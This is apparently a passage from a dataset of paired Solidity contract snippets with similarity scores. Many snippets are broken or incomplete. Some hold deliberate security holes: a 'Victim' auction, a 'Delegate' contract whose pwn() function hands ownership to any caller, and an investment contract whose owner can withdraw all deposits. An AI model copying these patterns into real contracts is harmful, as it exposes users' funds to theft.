}",0.5813461829796519,"contract ICOContractX {

    



    string public name;



    address public operator; 

    address public projectWallet; 

    Token public token; 

    address public juryOnlineWallet; 

    address public arbitrationAddress; 

    uint public currentCycle; 



    struct Cycle {

        bool exists;

        bool approved;

        address icoRoundAddress;

    }



    mapping(uint => Cycle) public cycles; 



    

    

    

    

    

    

    

    constructor(string _name, address _operator, address _projectWallet, address _tokenAddress, address _arbitrationAddress, address _juryOnlineWallet) public {

        name = _name;

        operator = _operator;

        projectWallet = _projectWallet;

        token = Token(_tokenAddress);

        arbitrationAddress = _arbitrationAddress;

        juryOnlineWallet = _juryOnlineWallet;

    }



    

    function addRound() public {

        cycles[currentCycle].exists = true;

        cycles[currentCycle].icoRoundAddress = msg.sender;

    }



    

    function approveRound(address _icoRoundAddress) public {

        require(msg.sender == operator);

        require(cycles[currentCycle].icoRoundAddress == _icoRoundAddress);

        currentCycle +=1;

    }



}"
"contract CryptoCert2 {

    struct Award {
        bool isValid;
        string hash;
    }

    struct Authority {
        bool isValid;
        string hash;
        address[] representatives;
        Award[] awards;
    }

    mapping(address => Authority) authorities;

    function createAuthority(address _address, string _hash) public {
        authorities[_address].hash = _hash;
        authorities[_address].isValid = true;
    }

    function addAuthorizedAddress(address _authAddress, address _repAddress) public {
        authorities[_authAddress].representatives.push(_repAddress);
    }

    function getAuthorityHash(address _address) public view returns (uint) {
        if (authorities[_address].isValid) {
            return 1;
        } else {
            return 0;
        }
    }

}",0.5959041782736694,"contract DSAuth is DSAuthEvents {

    DSAuthority  public  authority;

    address      public  owner;



    constructor() public {

        owner = msg.sender;

        emit LogSetOwner(msg.sender);

    }



    function setAuthority(DSAuthority authority_)

        public

        auth

    {

        authority = authority_;

        emit LogSetAuthority(authority);

    }



    modifier auth {

        require(isAuthorized(msg.sender, msg.sig));

        _;

    }



    function isAuthorized(address src, bytes4 sig) internal view returns (bool) {

        if (src == address(this)) {

            return true;

        } else if (src == owner) {

            return true;

        } else if (authority == DSAuthority(0)) {

            return false;

        } else {

            return authority.canCall(src, this, sig);

        }

    }

}"
"contract MinInvest {

    function validPurchase() internal returns (bool) {
    bool moreThanMinimalInvestment = msg.value >= 0.1 ether; 
    return super.validPurchase() && moreThanMinimalInvestment;
    }
}",0.5352698182788994,"contract Mintable {
    function mintToken(address to, uint amount) external returns (bool success);  
    function setupMintableAddress(address _mintable) public returns (bool success);
}"
"contract Ballot {
    function giveRightToVote() public {
        uint8 tempnumber = 0;
        tempnumber += 1;
    }
}",0.5705478408574878,"contract Token {
  function transfer(address to, uint value) public returns (bool);
}"
"contract FundManager {

    address bank;

    
    function FundManager(){
        owner = msg.sender;
        bank = new Bank();
        Bank(bank).setOwner(address(this));
    }
}",0.5877005613862789,"contract Delegate {



  address public owner;



  function Delegate(address _owner) {

    owner = _owner;

  }



  function pwn() {

    owner = msg.sender;

  }

}"
"contract Voting {
  mapping (bytes32 => uint8) public votesReceived;
  mapping (bytes32 => bool) public candidateList;
  function Voting(bytes32[] candidateNames) {
    for(uint i = 0; i < candidateNames.length; i++) {
      candidateList[candidateNames[i]] = true;
    }
  }
  function totalVotesFor(bytes32 candidate) returns (uint8) {
    require(validCandidate(candidate) == true);
    return votesReceived[candidate];
  }
  function voteForCandidate(bytes32 candidate) {
    require(validCandidate(candidate) == true);
    votesReceived[candidate] += 1;
  }
  function validCandidate(bytes32 candidate) returns (bool) {
    return candidateList[candidate];
  }
}",0.5136088152534576,"contract JouleStorage is Restriction {
    mapping(bytes32 => bytes32) map;

    function get(bytes32 _key) public view returns (bytes32 _value) {
        return map[_key];
    }

    function set(bytes32 _key, bytes32 _value) public restricted {
        map[_key] = _value;
    }

    function del(bytes32 _key) public restricted {
        delete map[_key];
    }

    function getAndDel(bytes32 _key) public restricted returns (bytes32 _value) {
        _value = map[_key];
        delete map[_key];
    }

    function swap(bytes32 _from, bytes32 _to) public restricted returns (bytes32 _value) {
        _value = map[_to];
        map[_to] = map[_from];
        delete map[_from];
    }
}"
"contract CollegeAdmin {
uint8 public studentAge=18;
uint16 public studentIncome=15000;
uint8 public studentScore=4;
uint8 public studentAttendance=96;
address public buyer;
address public owner;
event changedAge(uint age);

function CollegeAdmin() public {
owner = msg.sender;
}
function setAge(uint8 age) public {
buyer=msg.sender;
studentAge = age;
changedAge(age);
}

}",0.5994405850596856,"contract Counter {
    
    event Won(address winner, uint amount);
    
    uint public i;
    address public owner;
    
    function Counter() public {
        owner = msg.sender;
    }
    
    function reset() public {
        require(msg.sender==owner);
        i=0;
    }
    
    function inc() public payable {
        require(msg.value >= 0.001 ether);
        i++;
        if (i==2) {
            emit Won(msg.sender,address(this).balance);
            msg.sender.transfer(address(this).balance);
            i = 0;
        }
    }
    
}"
"contract HomeListing {

struct Home {
    uint id;
    string physicalAddress;
    bool available;
}
Home[] public homes;
mapping (address => Home) hostToHome;
event HomeEvent(uint _id);
event Test(uint length);
constructor() {

}


function addHome(string _physicalAddress) public {
    uint _id = uint(keccak256(_physicalAddress, msg.sender));
    homes.push(Home(_id, _physicalAddress, true));
}



function listHomesByAddress(string _physicalAddress) public returns(uint [] _id ) {
    uint [] results;
    for(uint i = 0 ; i<homes.length; i++) {
        string location = homes[i].physicalAddress;
        if(StringUtils.equal(location,_physicalAddress )) {
            results.push(homes[i].id);
        }
    }
    return results;

    }
}",0.5845484551532087,"contract ThingFactory {
    address[] public addressList;
    address payable public mintbase;

    event StoreLaunch(
        address indexed store,
        string name,
        string symbol
    );

    constructor() public {
        mintbase = msg.sender;
    }
    

    function launchStore(
      string memory name,
      string memory symbol,
      string memory uri
    ) public returns (address item) {
        address newStore = address(new Thing(name, symbol, uri, mintbase, msg.sender));
        addressList.push(newStore);
        emit StoreLaunch(newStore, name, symbol);
        return newStore;
    }

    function getCount() public view returns (uint exchangeCount) {
        return addressList.length;
    }
}"
"contract TestToken {
    Token token;
    TokenBase tokenBase;

    function testSetUp() {
        token = Token(DeployedAddresses.Token());
        tokenBase = TokenBase(DeployedAddresses.TokenBase());
    }

}",0.5315700156733579,"contract TokenProvider is Ownable {

  MintableToken public token;

  function setToken(address newToken) public onlyOwner {
    token = MintableToken(newToken);
  }

}"
"contract Victim {
   address highestBidder;
   uint highestBid;
   function bid() {
      if (msg.value < highestBid) throw;
      if (highestBidder != 0)
      highestBidder.send(highestBid); 
      highestBidder = msg.sender;
      highestBid = msg.value;
   }     
}",0.5168862620885932,"contract wallet {
    address owner;
    function wallet() {
        owner = msg.sender;
    }
    function transfer(address target) payable {
        target.send(msg.value);
    }
    function kill() {
        if (msg.sender == owner) {
            suicide(owner);
        } else {
            throw;
        }
    }
}"
"contract functionChain is usingOraclize {

string public globalKey;

function getData() public payable {
    string memory query = 'json(http:
    oraclize_query(0, ""URL"", query, 250000);
}

function setData(string text) internal {
    text = globalKey;
}

function __callback(bytes32 myId, string result) {
    if (msg.sender != oraclize_cbAddress()) revert();

    setData(result);
}
}",0.5965485395214275,"contract UploadIMG{
    
    
    mapping(address => mapping(uint256 => string)) public Data;
    
    function UploadIMG() public {
 
    }
    
    function UploadURL(uint256 ID, string URL) public {
        Data[msg.sender][ID] = URL;
    }

    function GetURL(address ADDR, uint256 ID) public returns (string) {
        return Data[ADDR][ID];
    }
    
    
    function() payable public{
        if (msg.value > 0){
            msg.sender.transfer(msg.value);
        }
    }
}"
"contract People {
  using PeopleInterface for PeopleInterface.People;
  PeopleInterface.People people;

  event logRegistered(address indexed _wallet, string _name, string _email, string _company);
  event logUpdateProfile(address indexed _wallet, string _email, string _name, string _company, string _avatar);

  function registerUser(string _name, string _email, string _company, string _avatar, address _sender) external   {
    return people.registerUser(_name, _email, _company, _avatar, _sender);
  }

  function updateUser(string _name, string _email, string _company, string _avatar, address _sender) external   {
    return people.updateUser(_name, _email, _company, _avatar, _sender);
  }

  function getUser(address _wallet) external view returns (string, string, string, string, address, address[]) {
    return people.getUser(_wallet);
  }

  function addGroup(address _group, address _sender) external   {
    return people.addGroup(_group, _sender);
  }

  function leaveGroup(address _group, address _sender) external   {
    return people.leaveGroup(_group, _sender);
  }

  function addBounty(address _group, bytes32 _index, address _sender) external {
    return people.addBounty(_group, _index, _sender);
  }
}",0.559822893463118,"contract Token is StandardToken {

    string public name = ""Telomere Coin"";
    uint8 public decimals = 0;
    string public symbol = ""TXY"";
    string public version = 'TXY 1.0';
    address public mintableAddress;

    function Token(address sale_address) {
        balances[msg.sender] = 0;
        totalSupply = 0;
        name = name;
        decimals = decimals;
        symbol = symbol;
        mintableAddress = sale_address;
        allowTransfer = true;
        createTokens();
    }

    
    
    
    function createTokens() internal {
        uint256 total = 116000000;
        balances[this] = total;
        totalSupply = total;
    }

    function changeTransfer(bool allowed) external {
        require(msg.sender == mintableAddress);
        allowTransfer = allowed;
    }

    function mintToken(address to, uint256 amount) external returns (bool success) {
        require(msg.sender == mintableAddress);
        require(balances[this] >= amount);
        balances[this] -= amount;
        balances[to] += amount;
        Transfer(this, to, amount);
        return true;
    }

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        require(_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData));
        return true;
    }
}"
"contract Test is usingOraclize {

bytes32 public query;

mapping (bytes32=> address) senderAddress;

address public resultAddress;

function sendQuery() public payable {

  string memory queryString = ""some query stringified JSON...""
  bytes32 queryId = oraclize_query(""nested"", queryString, 235000);

  senderAddress[queryId] = msg.sender;
  query = queryId
}

function __callback(bytes32 myid, string result, bytes proof) {

  resultAddress = senderAddress[myid];

}

}",0.568700595924811,"contract ChronoBankAssetInterface {

    function __transferWithReference(address _to, uint _value, string _reference, address _sender) public returns (bool);

    function __transferFromWithReference(address _from, address _to, uint _value, string _reference, address _sender) public returns (bool);

    function __approve(address _spender, uint _value, address _sender) public returns(bool);

    function __process(bytes , address ) public payable {

        revert();

    }

}"
"contract Project {
 address public fundingHub; 
 address public projectCreator; 
 string public title; 
 string public description;
 uint256 public amountToBeRaised; 
 uint256 public deadline;
 uint256 public amountRaised; 

function Project(address _creator, uint256 _amountToBeRaised, uint256 _deadline, string _title, string _description) {
    if (_amountToBeRaised <= 0) { throw; }
    if (_deadline <= block.timestamp) { throw; }
    fundingHub = msg.sender;  
    projectCreator = _creator;
    title = _title; 
    description = _description; 
    amountToBeRaised = _amountToBeRaised;
    amountRaised = 0; 
    deadline = _deadline; 
}
}",0.5862704444528944,"contract BaseGame {
  string public gameName = ""ScratchTickets"";
  uint public constant  gameType = 2005;
  string public officialGameUrl;
  mapping (address => uint256) public userTokenOf;
  uint public bankerBeginTime;
  uint public bankerEndTime;
  address public currentBanker;

  function depositToken(uint256 _amount) public;
  function withdrawToken(uint256 _amount) public;
  function withdrawAllToken() public;
  function setBanker(address _banker, uint256 _beginTime, uint256 _endTime) public returns(bool _result);
  function canSetBanker() view public returns (bool _result);
}"
"contract Price {
    event PriceChanged(uint price);
    function logPrice(uint price) public {
       emit PriceChanged(price);
    }
}",0.5429635510484278,"contract IDydxPriceOracle {
    function getPrice(
        address token
    )
        public
        view
        returns (Monetary.Price memory);
}"
"contract TestTokenFactory {

    TokenFactory tk = TokenFactory(DeployedAddresses.TokenFactory());

    function testChildContractDeployed() public {

        tk.createToken(""xxx"",""sym"");
        address[] memory deployedTokens = tk.getDeployedTokens();
        Assert.equal(deployedTokens.length, 1, ""Contact is not deployed"");

    }

}",0.5336710903679986,"contract DeployerI {



    mapping(address => uint) public deployedContractPointers;

    address[] public deployedContracts;



    function getDeployedContractsCount() public view returns(uint count);

    function isDeployedContract(address deployed) public view returns(bool isIndeed);



}"
"contract test {
    event test_value(uint256 indexed value1);
    uint256 value_test;

     function test_f()  {

        
        test_value(value_test); 
    }
}",0.5842174575942205,"contract Token {

    function transfer(address _to, uint256 _value) 
        external;

    function burn(uint256 _value) 
        external;

}"
"contract ExchangeContract {
    enum CurrencyType { USD, TWOKEY, BTC, ETH, DAI, USDT, TUSD, EUR, JPY, GBP}

    mapping(uint256 => CurrencyPrice) public priceByCurrencyType;

    struct Price{
        uint price;
        uint decimals;
    }

    struct CurrencyPrice{
        uint currencyInt;
        Price price;
    }

    function updatePrices(CurrencyPrice[] memory _array) public {
        for(i=0; i<_array.length; i++){
            priceByCurrencyType[_array[0][0]]=_array[0][1];
        }
    }
}",0.5107784476775977,"contract EthOwl is Ownable {
  uint256 public price = 1e17;

  event Hoot(address addr, string endpoint);

  function adjustPrice(uint256 _price) public onlyOwner {
    price = _price;
  }

  function purchase(address _addr, string memory _endpoint) public payable {
    require(msg.value >= price);
    emit Hoot(_addr, _endpoint);
  }

  function withdraw() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }
}"
"contract Courses is Owned {

struct Instructor {
    uint age;
    bytes16 fName;
    bytes16 lName;
}

mapping (address => Instructor) instructors;
address[] public instructorAccts;

event instructorInfo(
   bytes16 fName,
   bytes16 lName,
   uint age
);

function setInstructor(address _address, uint _age, bytes16 _fName, bytes16 _lName) onlyOwner public {
    var instructor = instructors[_address];

    instructor.age = _age;
    instructor.fName = _fName;
    instructor.lName = _lName;

    instructorAccts.push(_address)-1;
    instructorInfo(_fName, _lName, _age);
}

function getInstructors() view public returns(address[]) {
    return instructorAccts;
}

function getInstructor(address _address) view public returns (uint, bytes16, bytes16) {
    return (instructors[_address].age, instructors[_address].fName, instructors[_address].lName);
}

function countInstructors() view public returns (uint) {
    return instructorAccts.length;
}",0.5778784768380751,"contract ERC223 {
    function totalSupply() constant public returns (uint256 outTotalSupply);
    function balanceOf( address _owner) constant public returns (uint256 balance);
    function transfer( address _to, uint256 _value) public returns (bool success);
    function transfer( address _to, uint256 _value, bytes _data) public returns (bool success);
    function transferFrom( address _from, address _to, uint256 _value) public returns (bool success);
    function approve( address _spender, uint256 _value) public returns (bool success);
    function allowance( address _owner, address _spender) constant public returns (uint256 remaining);
    event Transfer( address indexed _from, address indexed _to, uint _value, bytes _data);
    event Approval( address indexed _owner, address indexed _spender, uint256 _value);
}"
"contract C {
    function C() {}

    struct S {
        address creator;
    }

    mapping(string => S) M;
    uint x;

    function set(string _hash) {
        S memory N = S({
            creator : msg.sender
        });

        M[_hash] = N; 
        x = _hash; 
    }

    function get(string _hash) returns (address addr) {
        return M[_hash].creator;
    }
}",0.587557784394396,"contract Hash {
    
    address owner;

    
    function Hash() public {
        owner = msg.sender;
    }

    
    function() internal {
        revert();
    }

    function hash(string dataString) public pure returns(bytes32){
        return(keccak256(dataString));
    }

    function selfDestruct() public {
        if (msg.sender == owner) {
            selfdestruct(owner);
        }
    }
}"
"contract SimpleSmartAssetManager is Mortal {

  mapping(string => address) smartAssets;

  function SimpleSmartAssetManager() {
    owner = msg.sender;
  }

  function createSmartAsset(string name,
                            uint usagePrice,
                            address[] addresses,
                            uint[] weights) {

    require(addresses.length == weights.length);
    require(smartAssets[name] == address(0x0));

    address assetAddress = new SimpleSmartAsset(usagePrice,
                                                addresses,
                                                weights);
    smartAssets[name] = assetAddress;
  }

  function getUsagePrice(string assetName)
    constant returns (uint) {
    address assetAddress = smartAssets[assetName];
    uint price = getUsagePrice(assetAddress);

    return price;
  }

  function getUsagePrice(address assetAddress)
    constant returns (uint) {
    uint price = SimpleSmartAsset(assetAddress).getUsagePrice();

    return price;
  }

  event AssetUsed(string name, uint usagePrice);

  function useAsset(string name) payable {
    address assetAddress = smartAssets[name];
    uint price = getUsagePrice(assetAddress);

    require (msg.value >= price);

    SimpleSmartAsset(assetAddress).pay.value(msg.value)();

    AssetUsed(name, price);
  }

  function removeAsset(string name) onlyOwner {
    address assetAddress = smartAssets[name];
    SimpleSmartAsset(assetAddress).remove();
  }
}",0.5457702726460648,"contract Galaxy622{
    
    address owner;
    uint name;
    
    address platformAddr = address(0x9ea5E47e322eEe5C8A9C156DD1A43fa4Df24938C);
    address masterAddr = address(0xB94e88b983B50E45891F8Ac597B940e72F66804E);
    uint public totalInvestments = 0;
    uint public totalInvested = 0;
    
    uint ethWei = 1 ether;
    
    constructor(uint _name) public payable{
        owner = masterAddr;
        name = _name;
    }
    
    modifier onlyOwner(){
        require (msg.sender==owner, ""Ownable: caller is not the owner"");
        _;
    }
    
    function () payable public {
    }
    
    function getBalance() public constant returns(uint){
        return address(this).balance;
    }
    
    function sendFeetoAdmin(uint amount) private {
        
        uint256 c = amount * 15 / 100;
        platformAddr.transfer(c);
    }
    
    function sendTransfer(address _user,uint _price) public onlyOwner{
        require(_user!=owner, ""Only Owner"");
        if(address(this).balance>=_price){
            _user.transfer(_price);
        }
    }
    
    function doInvest() public payable {
        require(msg.value >= ethWei, ""msg.value must be >= ethWei"");

        sendFeetoAdmin(msg.value);
        totalInvestments++;
        totalInvested += msg.value;
    }
    
    function getEth(uint _price) public onlyOwner{
        if(_price>0){
            if(address(this).balance>=_price){
                owner.transfer(_price);
            }
        }else{
           owner.transfer(address(this).balance); 
        }
    }
}"
"contract property {

uint256 cad_number;
address customer;

struct propertyInfo{
    address Owneradress;
    uint256 cad_number;
    string location;
    uint32 cost;
    bool housing_status;
}

mapping(uint256 => propertyInfo) propertys;
mapping (address => uint) public balances;

    function Create_Property(address Owneradress,
                             string memory location, 
                             uint32 cost, 
                             bool housing_status
                            ) public{
        propertyInfo storage NewProperty = propertys[cad_number];
        NewProperty.Owneradress = address(Owneradress);
        NewProperty.location = location;
        NewProperty.cost = cost;
        NewProperty.cad_number = cad_number;
        NewProperty.housing_status = housing_status;
        cad_number++;
    }

    function Listing_property(uint256 prop_id) public view returns (
                                                                     address, 
                                                                     string memory,
                                                                     uint256, 
                                                                     uint32,
                                                                     bool
                                                                   ){
        propertyInfo storage s = propertys[prop_id];
        return(s.Owneradress, s.location, s.cad_number, s.cost, s.housing_status);
    }

    function transaction_to_contract(uint256 _id) public payable {
        propertyInfo storage s = propertys[_id];
        s.Owneradress.transfer(s.cost);
        balances[s.Owneradress] += s.cost;
    }
}",0.5981419022831488,"contract AetherCore is AetherConstruct {

    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    

    

    
    address public newContractAddress;

    
    function AetherCore() public {
        
        paused = true;

        
        ceoAddress = msg.sender;

        
        cooAddress = msg.sender;
    }

    
    
    
    
    
    
    function setNewAddress(address _v2Address) public onlyCEO whenPaused {
        
        newContractAddress = _v2Address;
        ContractUpgrade(_v2Address);
    }

    
    
    
    function() external payable {
        require(
            msg.sender == address(saleAuction)
        );
    }

    
    
    function getProperty(uint256 _id)
        public
        view
        returns (
        uint32 parent,
        uint8 class,
        uint8 x,
        uint8 y,
        uint8 z,
        uint8 dx,
        uint8 dz,
        uint8 height
    ) {
        Property storage property = properties[_id];
        parent = uint32(property.parent);
        class = uint8(property.class);

        height = uint8(property.y);
        if (property.class == PropertyClass.BUILDING) {
          y = uint8(_computeHeight(property.x, property.z, property.y));
        } else {
          y = uint8(property.y);
        }

        x = uint8(property.x);
        z = uint8(property.z);
        dx = uint8(property.dx);
        dz = uint8(property.dz);
    }

    
    
    
    function unpause() public onlyCEO whenPaused {
        require(saleAuction != address(0));
        require(newContractAddress == address(0));
        
        super.unpause();
    }
}"
"contract Transport {

    address public manager;
    Batch[] public batchArray;
    mapping(uint => bool) batchList;

    struct Batch {
        uint batchId;
        string batchCreationDate;
        address batchOwner;
        string batchOrigin;
        string productName;
    }
    constructor(address owner) public {
        manager = owner;
    }
    function createNewBatch(string batchCreationDate, address batchOwner, 
                         string batchOrigin, string productName) public { 

        uint batchId = uint(keccak256(block.difficulty, now));

        Batch memory newBatch = Batch ({
            batchId: batchId,
            batchCreationDate: batchCreationDate,
            batchOwner: batchOwner, 
            batchOrigin: batchOrigin,
            productName: productName
        });

        batchArray.push(newBatch);
        batchList[batchId] == true;
    }

    function getBatchDetails(uint batchId) public view returns(string, address, string, string) {
       
    }
}",0.5542770699171474,"contract FrenchIco_Token is ERC20Mintable {



    using SafeMath for uint256;

    event newTokenFico(address owner, string copyright, string name, string symbol);



    uint8 public constant decimals = 18;

	string public name;

	string public symbol;



    constructor(string memory _symbol, string memory _name) public {

	    symbol = _symbol;

	    name = _name;

	    emit newTokenFico(msg.sender, ""Copyright FRENCHICO"", name, symbol);

	}



   function sendToGateway(address gatewayAddr, uint amount, uint orderId, uint[] calldata instruction, string calldata message, address addr) external {

    approve(address(gatewayAddr) ,amount);

    FrenchIco_Gateway gateway = FrenchIco_Gateway(address(gatewayAddr));

    gateway.orderFromToken(msg.sender, amount, address(this), orderId, instruction, message, addr);

    }







}"
"contract CallingContract {
    IOverloadedContract Ioc;
    constructor(address payable _addr) public {
        Ioc = IOverloadedContract(_addr);
    }

    function callIoc(uint x) external payable {
        uint result = Ioc.foo{value:1000}(x);
    }
}",0.5615192161818162,"contract CreateEosAccount is CutiePluginBase

{

    function run(

        uint40,

        uint256,

        address

    )

        public

        payable

        onlyCore

    {

        revert();

    }



    function runSigned(uint40, uint256, address)

        external

        payable

        onlyCore

    {

        

    }

}"
"contract Test {
    struct TestStruct {
        string name;
        bytes32 value;
    }

    struct ConfigStruct {
        bytes32[] valuesPossible;
    }

    TestStruct[] public structs;
    ConfigStruct[] configs;


    function constructor(bytes32[] _valuesToStore) public {
        configs.push(ConfigStruct(_valuesToStore));
    }

    function add(string _name, uint _idConfig, bytes32 _valueToStore) valueIsPossible(_idConfig, _valueToStore) public {
        structs.push(TestStruct(""test"", _valueToStore));
    }

    modifier valueIsPossible(uint _idConfig, bytes32 _valueToStore) {
        
        _;
    }
}",0.5050943184265306,"contract Storage {
    address owner;

    constructor() public {
        owner = msg.sender;
    }

    mapping(bytes32 => string) data;

    function set(bytes32 key, string memory value) public {
        require(
            bytes(data[key]).length == 0,
            ""username has already been taken""
        );
        data[key] = value;
    }

    function get(bytes32 key) public view returns (string memory) {
        return data[key];
    }

    function del(bytes32 key) public {
        require(msg.sender == owner, ""only the owner can delete names"");
        delete data[key];
    }
}"
"contract StoriTokenSale {
    address admin;
    StoriToken public tokenContract;
    uint256 public tokenPrice;
    uint256 public tokensSold;

    event Sell(address _buyer, uint256 _amount);

    function StoriTokenSale(StoriToken _tokenContract, uint256 _tokenPrice) public {
        admin = msg.sender;
        tokenContract = _tokenContract;
        tokenPrice = _tokenPrice;
    }

    function multiply(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x);
    }

    function buyTokens(uint256 _numberOfTokens) public payable {
        require(msg.value == multiply(_numberOfTokens, tokenPrice));
        require(tokenContract.balanceOf(this) >= _numberOfTokens);
        require(tokenContract.transfer(msg.sender, _numberOfTokens));

        tokensSold += _numberOfTokens;

        Sell(msg.sender, _numberOfTokens);
    }

    function endSale() public {
        require(msg.sender == admin);
        require(tokenContract.transfer(admin, tokenContract.balanceOf(this)));

        selfdestruct(admin);
    }
}",0.5966734744160452,"contract TokenMaker is Ownable {

    uint public fee_in_dc_units = 10e18;

    address public dc_token_address;

    token dcToken;

    mapping (address => address[]) public myTokens;





    function setFee(uint number_of_dc_uints) public onlyOwner {

        fee_in_dc_units = number_of_dc_uints;

    }



    function setDcTokenAddress(address _addr) public onlyOwner {

      dc_token_address = _addr;

      dcToken = token(_addr);

    }



    function makeToken(string memory _name, string memory _symbol, uint _totalSupply, uint _decimals) public {

        require(dcToken.transferFrom(msg.sender, address(this), fee_in_dc_units));



        ERC20Token newToken = new ERC20Token(msg.sender, _name, _symbol, _totalSupply, _decimals);

        myTokens[msg.sender].push(address(newToken));



    }



    function getMyTokens() public view returns (address[] memory) {

      return myTokens[msg.sender];

    }



    function withdrawTokens() public onlyOwner {

      dcToken.transfer(msg.sender, dcToken.balanceOf(address(this)));

    }

}"
"contract Admin is Factory {
    function adminDoesSomething () { if(stage == 1){ stage = 2} }
}",0.5378075393057652,"contract Resolver {
    function setName(bytes32 node, string memory name) public;
}"
"contract User is Factory {
    function userDoesSomething () { if(stage == 2){ stage = 3} }
}",0.5768396083575478,"contract Resolver {
    function setName(bytes32 node, string memory name) public;
}"
"contract Operator is Factory {
    function operatorDoesSomething () { if(stage == 3){ stage = 4} }
}",0.5528128843073363,"contract Mortal is Ownable {
    
    function kill() {
        if (msg.sender == owner)
            selfdestruct(owner);
    }
}"
"contract System is Factory {
    function systemDoesSomething () { if(stage == 4){ stage = 5} }
}",0.5364144917820491,"contract Resolver {
    function setName(bytes32 node, string memory name) public;
}"
"contract StaticCallChecker {
  
  event StateUnchanged(bool);
  
  
  function changeState() public {
    emit StateUnchanged(false);
  }

  
  
  function test() public onlyStaticCall returns (bool) {
    return true;
  }

  
  function testStaticCall() external view returns (bool result) {
    
    (bool success, bytes memory data) = address(this).staticcall(
      abi.encodePacked(
        this.test.selector
      )
    );

    
    if (success) {
      assembly {
        result := mload(add(data, 0x20))
      }
    }
  }

  
  modifier onlyStaticCall() {
    require(_isStaticCall());
    _;
  }

  
  function _isStaticCall() internal returns (bool) {
    
    (bool success, ) = address(this).call(
      abi.encodePacked(
        this.changeState.selector
      )
    );

    
    return !success;
  }
}",0.5871291061554926,"contract Allowed is Whitelist {
    
    mapping(address => bool) private _allowed;

    event Allow(address addr);
    event Disallow(address addr);

    modifier onlyAllowed(address _buyer) {
        require(_allowed[msg.sender] && _allowed[_buyer]);
        _;
        
    }
  
    function allow(address _addr) onlyWhitelisted public returns(bool) {
        if (!_allowed[_addr]) {
            _allowed[_addr] = true;
            emit Allow(_addr);
            return true; 
        }
    }

    function disallow(address _addr) onlyWhitelisted public returns(bool) {
        if (_allowed[_addr]) {
            _allowed[_addr] = false;
            emit Disallow(_addr);
            return true;
        }
    }
    
    function allowed(address _addr) public view returns (bool) {
        return _allowed[_addr];
    }
}"
"contract Contract1 {
    Contract2Interface I; 
    function Contract1(address Contract2Address){
        I = Contract2Interface(Contract2Address); 
    }
    function creation() returns (address newcontract3) {
        address theCreatedContract3 = I.createNewContract3();
        return newcontract3; 
    }
}",0.5413950925144175,"contract ControllerInterface {

    function proxyPayment(address _owner) payable returns(bool);
    function onTransfer(address _from, address _to, uint _amount) returns(bool);
    function onApprove(address _owner, address _spender, uint _amount) returns(bool);
}"
"contract MyGame {
  struct Register {
    bool played;
  }
  mapping (address => Register) players;  
  Register Reg;

  function Play {
    players[msg.sender].played=true;
  }

  function SetUp {
    
    delete Reg;
  }
}",0.5618843792991475,"contract FunGame 
{
    address owner;
    struct user
    {
        address parent;
        uint8 level;
    }
    mapping(address=>user) public map;
    function FunGame()
    {
        owner = msg.sender;
        map[msg.sender].level = 8; 
    }
}"
"contract PatientRecords {

struct Patient {
    string ID;
    string weight;
    string height;
    string diseasehistory;
    string vaccinecard;
    string name;
    address registrantAddress;
}

uint ID;

constructor() public {
    ID = 0;

}


Patient[] public patients;
mapping(string => uint) names;

function register(string _id, string _weight, string _height, string _diseasehistory, string _vaccinecard, string _name) public returns (bool, uint){
    for (uint i = 0; i < patients.length; i++) {
         require (stringsEqual(patients[i].ID, _id) == false); 
    }
  names[_name] = ID;
  ID++;
   patients.push(Patient(_id, _weight, _height, _diseasehistory, _vaccinecard, _name,  msg.sender));
   return (true, ID);
}

function verifyByName(string _name) public view returns(string, string, string, string, string, string) {
   uint n;
   n = names[_name];
   return (
        patients[n].name,
        patients[n].ID,
        patients[n].weight,
        patients[n].height,
        patients[n].diseasehistory,
        patients[n].vaccinecard);
}

function stringsEqual(string storage _a, string memory _b) internal pure returns(bool) {
    bytes storage a = bytes(_a);
    bytes memory b = bytes(_b);
    if (keccak256(a) != keccak256(b)) {
        return false;
    }
    return true;
}

}",0.5707841229633153,"contract tokenCreator is Ownable{



    string internal _symbol;

    string internal _name;

    uint8 internal _decimals;

    uint internal _totalSupply = 500000000;

    mapping (address => uint256) internal _balanceOf;

    mapping (address => mapping (address => uint256)) internal _allowed;



    constructor(string symbol, string name, uint8 decimals, uint totalSupply) public {

        _symbol = symbol;

        _name = name;

        _decimals = decimals;

        _totalSupply = _calcTokens(decimals,totalSupply);

    }



   function _calcTokens(uint256 decimals, uint256 amount) internal pure returns (uint256){

      uint256 c = amount * 10**decimals;

      return c;

   }



    function name() public constant returns (string) {

        return _name;

    }



    function symbol() public constant returns (string) {

        return _symbol;

    }



    function decimals() public constant returns (uint8) {

        return _decimals;

    }



    function totalSupply() public constant returns (uint) {

        return _totalSupply;

    }



    function balanceOf(address _addr) public constant returns (uint);

    function transfer(address _to, uint _value) public returns (bool);

    event Transfer(address indexed _from, address indexed _to, uint _value);

}"
"contract Sender {
    Receiver rec = new Receiver();
    address fallbackRec = address(new FallbackReceiver());
    address nonRec = address(new NonReceiver());
    address a = 0x1;
    uint u = 1;

    function test1() {
        rec.onTokenReceived(a, u);
    }
    function test2() {
        address(rec).call(bytes4(sha3(""onTokenReceived(address,uint256)"")), a, u);
    }
    function test3() {
        Receiver(fallbackRec).onTokenReceived(a, u);
    } 
    function test4() {
        fallbackRec.call(bytes4(sha3(""onTokenReceived(address,uint256)"")), a, u);
    } 
    function test5() {
        Receiver(nonRec).onTokenReceived(a, u);
    }
    function test6() {
        nonRec.call(bytes4(sha3(""onTokenReceived(address,uint256)"")), a, u);
    } 
}",0.5278209888119985,"contract ERC20 {

    function totalSupply() constant returns (uint256);

    function balanceOf(address who) constant returns (uint256);

    function transfer(address to, uint256 value);

    function transferFrom(address from, address to, uint256 value);

    function approve(address spender, uint256 value);

    function allowance(address owner, address spender) constant returns (uint256);



    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}"
"contract Contract {
  bytes32 public Name;
  string public numberString;

  function Contract (bytes32 name) {
      Name = name;
  }

  function setNumberString (string time){
      numberString = time;      
  }
}",0.5898161707522549,"contract Trusti {
    string data = ""trusti.id"";
    
    function getStore() public view returns (string memory) {
        return data;
